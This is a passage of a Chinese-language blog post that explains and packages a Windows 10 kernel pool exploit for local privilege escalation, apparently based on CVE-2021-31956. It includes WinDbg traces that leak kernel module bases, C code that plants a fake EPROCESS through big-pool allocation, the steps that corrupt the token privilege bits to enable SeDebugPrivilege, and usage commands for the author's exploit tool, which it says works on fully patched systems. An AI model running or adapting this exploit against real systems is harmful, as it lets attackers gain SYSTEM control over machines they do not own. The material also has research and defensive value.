	       \FileSystem\Npfs	FLTMGR!FltpPassThroughCompletion
			Args: 00000100 000001d8 0011003c 00000000
 [IRP_MJ_FILE_SYSTEM_CONTROL(d), N/A(0)]
            4  1 ffffbe077eb95850 ffffbe07933bb320 00000000-00000000    pending
	       \FileSystem\FltMgr
			Args: 00000100 000001d8 0011003c 00000000
1: kd> dt nt!_file_object ffffbe07933bb320
   +0x000 Type             : 0n5
   +0x002 Size             : 0n216
   +0x008 DeviceObject     : 0xffffbe07`7e6e58f0 _DEVICE_OBJECT
   +0x010 Vpb              : (null) 
   +0x018 FsContext        : 0xffffad09`db8d3900 Void
   +0x020 FsContext2       : 0xffffad09`df8c7991 Void
   +0x028 SectionObjectPointer : (null) 
....
kd> ?rcx - 0xffffad09`df8c7990=140 ;也就是ffffad09`df8c7ad0 - 0xffffad09`df8c7990 = 140 = ROOT_PIPE_ATTRIBUTE_OFFSET
Evaluate expression: 320 = 00000000`00000140
1: kd> dq 0xffffad09`df8c7990
ffffad09`df8c7990  00000002`00000204 0000000c`00000003
ffffad09`df8c79a0  00000101`00000002 ffffad09`db8d3a08
ffffad09`df8c79b0  ffffad09`db8d3a08 ffffad09`db8d3900
//0xffffad09`df8c7990+FILE_OBJECT_OFFSET指向file_object:=>ffffbe07`933bb320
ffffad09`df8c79c0  ffffbe07`933bb320 ffffbe07`933ba1f0
ffffad09`df8c79d0  00000000`00000001 ffffbe07`86bdf000
ffffad09`df8c79e0  ffffbe07`86bdf000 00001440`00000001
ffffad09`df8c79f0  00010000`00000001 00000000`00001440
ffffad09`df8c7a00  ffffad09`df8c7a09 00000000`00000000
```
可见 xploit->leak_root_attribute -ROOT_PIPE_ATTRIBUTE_OFFSET+FILE_OBJECT_OFFSET处存放的就是当前file_object指针,顺着这个思路可以得到NpFsdCreate
```
1: kd> dx -id 0,0,ffffbe07872d0080 -r1 ((ntkrnlmp!_DEVICE_OBJECT *)0xffffbe077e6e58f0)
((ntkrnlmp!_DEVICE_OBJECT *)0xffffbe077e6e58f0)                 : 0xffffbe077e6e58f0 : Device for "\FileSystem\Npfs" [Type: _DEVICE_OBJECT *]
    [<Raw View>]     [Type: _DEVICE_OBJECT]
    Flags            : 0x240
    UpperDevices     : Immediately above is Device for "\FileSystem\FltMgr" [at 0xffffbe077eb95850]
    LowerDevices     : None
    Driver           : 0xffffbe077e93fe00 : Driver "\FileSystem\Npfs" [Type: _DRIVER_OBJECT *]
//这里就是驱动对象的主分发函数
1: kd> dqs 0xffffbe077e93fe00+70
ffffbe07`7e93fe70  fffff806`2f2ab540 Npfs!NpFsdCreate
ffffbe07`7e93fe78  fffff806`2f2ab140 Npfs!NpFsdCreateNamedPipe
1: kd> ?Npfs!NpFsdCreate-Npfs
Evaluate expression: 46400 = 00000000`0000b540
1: kd> ?Npfs!_imp_ExAllocatePoolWithTag-Npfs
Evaluate expression: 28752 = 00000000`00007050
1: kd> dqs fffff806`2f2a7050=Npfs!_imp_ExAllocatePoolWithTag
fffff806`2f2a7050  fffff806`299b1030 nt!ExAllocatePoolWithTag
fffff806`2f2a7058  fffff806`299b1010 nt!ExFreePool
1: kd> ?nt!ExAllocatePoolWithTag- nt
Evaluate expression: 10162224 = 00000000`009b1030
```
通过Npfs!NpFsdCreate计算出NpFs.sys模块的基址,获取Npfs!_imp_ExAllocatePoolWithTag的内部实现(具体可以参考PE导入表结构)指向nt!ExAllocatePoolWithTag指针,减去他的偏移最后就得到了nt模块的基址,笔者同时增加了另一种方式验证,加强程序的稳定性,获得这个基址的方法具体参考工具源码.

### 漏洞利用 ###

伪造一个内核态PROCESS结构体指针,除了通过pipe_attribute结构体占位和获取leak_root_queue相对偏移量得到它的实际指针地址之外,还可以通过一种叫[bigpool](https://blahcat.github.io/2019/03/17/small-dumps-in-the-big-pool/)的技术实现,这种技术可以分配任意大小的非分页内存可控数据并获得申请的地址,通过nt模块的内部调用SetThreadNameInformation实现,参数为一个UNICODE_STRING结构体,笔者已经将这种技术集成进了工具
```
DWORD64 setup_fake_eprocess_bigpool(xploit_t* xploit)
{
	char fake_eprocess_buf[0x10000] = { 0 };
	DWORD dwThreadID = 0;
	HANDLE	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fnExploit, 0, 0, &dwThreadID);	
	DWORD dwSize = 0x3000;
	PUCHAR fake_eprocess_attribute_buf = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE);
	memset(fake_eprocess_attribute_buf, 0x41, dwSize);
	initFakeEprocess(xploit, fake_eprocess_buf, (PVOID)(xploit->self_token + 0x48 + 1)); // Enabled
	memcpy(fake_eprocess_attribute_buf, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
	initFakeEprocess(xploit, fake_eprocess_buf, (PVOID)(xploit->self_token + 0x40 + 1)); // Present
	memcpy(fake_eprocess_attribute_buf + FAKE_EPROCESS_SIZE, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
	UNICODE_STRING target = { 0 };
	target.Length = dwSize;
	target.MaximumLength = 0xffff;
	target.Buffer = (PWSTR)fake_eprocess_attribute_buf;
		HRESULT hRes = NtSetInformationThread(hThread, (THREADINFOCLASS)ThreadNameInformation, &target, 0x10);
	DWORD dwBufSize = 1024 * 1024;
	DWORD dwOutSize;
	LPVOID pBuffer = LocalAlloc(LPTR, dwBufSize);
	hRes = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, pBuffer, dwBufSize, &dwOutSize);
	DWORD dwExpectedSize = target.Length + sizeof(UNICODE_STRING);
	ULONG_PTR StartAddress = (ULONG_PTR)pBuffer;
	ULONG_PTR EndAddress = StartAddress + 8 + *((PDWORD)StartAddress) * sizeof(BIG_POOL_INFO);
	ULONG_PTR ptr = StartAddress + 8;
	while (ptr < EndAddress)
	{
		PBIG_POOL_INFO info = (PBIG_POOL_INFO)ptr;
		//printf("Name:%s Size:%llx Address:%llx\n", info->PoolTag, info->PoolSize, info->Address);
		if (strncmp(info->PoolTag, "ThNm", 4) == 0 && dwExpectedSize == info->PoolSize)
		{
			xploit->fake_eprocess = (((ULONG_PTR)info->Address) & 0xfffffffffffffff0) + sizeof(UNICODE_STRING);
			printf("[+] fake_eprocess is : 0x%llx\n", xploit->fake_eprocess);
			return xploit->fake_eprocess;
		}
		ptr += sizeof(BIG_POOL_INFO);
	}	
	return NULL;
}
``` 
在幽灵块是poolheader->ProcessBilled放置了一个伪造的PROCESS结构体指针,可以看到在PspReturnQuota函数中根据异或ExpPoolQuotaCookie解引用了这个PROCESS指针,如果将EPROCESS其中的QuotaBlock字段保存了指向了当前进程的Token的Enabled和Present这2个字段的地址(需要调用2次),就能在_InterlockedCompareExchange这里将Enabled和Present值分别减去valueThunckSize也就是pool分配的大小0x210

```
// fake_eprocess地址
1: kd> dt nt!_EPROCESS 0xffffbe0786bdf030+50
   +0x000 Pcb              : _KPROCESS
   ....
   +0x470 ProcessQuotaUsage : [2] 0xffffad09`df82b0a9
//查看当前进程token   
1: kd> !token 0xffffad09df82b060
_TOKEN 0xffffad09df82b060
TS Session ID: 0x2
User: S-1-5-21-1858280601-1497283625-3896089107-1001 
//只有这些特权
Privs: 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
 34 0x000000022 SeTimeZonePrivilege               Attributes -   
//token Enabled   修改前值
1: kd> dq 0xffffad09df82b0a9
ffffad09`df82b0a9  00000000`00008000 00000000`00408000   
//token Enabled   修改后值
1: kd> dq 0xffffad09df82b0a9
ffffad09`df82b0a9  00000000`00007df0 00000000`00408000
//可以看到SeDebugPrivilege特权位已被设置
1: kd> !token 0xffffad09df82b060
_TOKEN 0xffffad09df82b060
TS Session ID: 0x2
User: S-1-5-21-1858280601-1497283625-3896089107-1001 
Primary Group: S-1-5-21-1858280601-1497283625-3896089107-513
Privs: 
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled 
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled 
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled 
 19 0x000000013 SeShutdownPrivilege               Attributes - Enabled 
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled 
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled 
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - Enabled 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
 34 0x000000022 SeTimeZonePrivilege               Attributes - 
```
通过调试可以看到token的Enabled和Present字段被减去了指定值导致SeDebugPrivilege特权位被设置.接下来就是注入winlogon进行和执行shellcode了,由于shellcode存在注入会话的冲突问题(多用户登录情况),笔者添加了一种基于父进程句柄创建进程的提权技术用于优化,具体可以参考[相关文章](https://windows-internals.com/faxing-your-way-to-system/).

##  工具使用方法 ##

下面是工具的具体使用方法

//安装驱动,需要管理员运行

sc create mydriver binpath=C:\dl\poolqudong.sys type=kernel start=demand error=ignore

//启动驱动

sc start mydriver&&sc query mydriver

//启动漏洞利用工具

poolfs.exe

//测试不同的pool类型

poolfs.exe 180 1


##  工具使用效果 ##

笔者的工具实现了全自动获取内核调试模块符号的偏移量,获取工具漏洞利用的所需信息,解决了不同windows版本适配问题,降低了蓝屏几率,提高了漏洞利用成功率,下面是在最新满补丁Windows 10 21h1上的运行结果.

![查看大图](https://s4.ax1x.com/2021/12/31/TfvaUH.png)


##  相关引用 ##

[作者原文](https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion)

[原文翻译](https://paper.seebug.org/1743/)

[big pool 泄露](https://blahcat.github.io/2019/03/17/small-dumps-in-the-big-pool/)

[父进程句柄利用](https://windows-internals.com/faxing-your-way-to-system/)

[pool利用](https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf)

[另一种CVE-2021-31956](https://dawnslab.jd.com/CVE-2021-31956/)

[kernelpool-exploitation](https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf)

[Exploiting a Windows 10 PagedPool](https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/)

[Sheep Year Kernel Heap Fengshui](http://www.alex-ionescu.com/?p=231)

[Corentin Bayet. Exploit of CVE-2017-6008 with Quota Process Pointer Overwrite attack](https://github.com/cbayet/Exploit-CVE-2017-6008/blob/master/Windows10PoolParty.pdf)


[Cesar Cerrudo Tricks to easily elevate its privileges](https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf)


[Matt Conover and w00w00 Security Development. w00w00 on Heap Overflows](http://www.w00w00.org/files/articles/heaptut.txt)

[pool windbg 插件](https://github.com/fishstiqz/poolinfo)

[笔者工具git](https://gitee.com/cbwang505/poolfengshui)


## 参与贡献 ##


作者来自ZheJiang Guoli Security Technology,邮箱cbwang505@hotmail.com